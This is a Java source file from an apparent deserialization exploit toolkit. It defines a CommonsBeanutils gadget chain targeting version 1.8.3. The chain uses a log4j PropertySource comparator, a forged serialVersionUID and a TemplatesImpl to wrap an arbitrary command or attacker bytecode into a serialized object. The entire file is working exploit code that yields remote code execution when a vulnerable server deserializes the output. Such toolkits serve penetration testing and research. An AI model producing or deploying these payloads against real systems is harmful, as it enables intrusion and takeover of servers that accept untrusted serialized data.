package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import com.xyuxu.javasec.utils.Serializer;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.util.PriorityQueue;

public class CommonsBeanutilsPropertySource_183 implements ObjectPayload<Object>, BytecodePayload<Object> {

    @Override
    public Object getObject(final String command) throws Exception {
        Serializer.hackSerialVersionUID(BeanComparator.class, -3490850999041592962L);

        final Object templates = TemplatesBytecodeGenerator.createTemplatesImpl(command);

        PropertySource propertySource = new PropertySource() {
            public int getPriority() { return 0; }
        };

        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(propertySource);
        queue.add(propertySource);

        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }

    @Override
    public Object getObjectWithBytecode(byte[] classBytes) throws Exception {
        Serializer.hackSerialVersionUID(BeanComparator.class, -3490850999041592962L);

        final Object templates = TemplatesBytecodeGenerator.createTemplatesImplWithBytecode(classBytes);

        PropertySource propertySource = new PropertySource() {
            public int getPriority() { return 0; }
        };

        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(propertySource);
        queue.add(propertySource);

        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }
}